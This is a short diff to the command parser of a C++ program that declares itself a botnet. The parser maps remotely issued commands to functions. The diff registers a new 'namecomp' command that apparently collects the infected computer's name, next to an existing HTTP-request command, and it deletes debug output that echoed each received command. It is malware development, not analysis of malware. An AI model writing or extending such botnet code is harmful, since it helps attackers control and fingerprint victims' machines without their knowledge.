@@ -7,6 +7,7 @@ namespace botnet {
     parser::parser(std::vector<std::string>& arr): arr_(arr) {
         // TODO: the functions of commands should be declared here
         funcs_["httpreq"] = http_req;
+        funcs_["namecomp"] = get_pcname;
     }
 
     void parser::execute() {
@@ -25,9 +26,6 @@ namespace botnet {
 
             command = arr[i].substr(0, found);
             content = arr[i].substr(found + 1);
-
-            std::cout << "command: " << command << '\n';
-            std::cout << "content: " << content << '\n';
 
             // if the command was defined in functions map
             // try execute the command
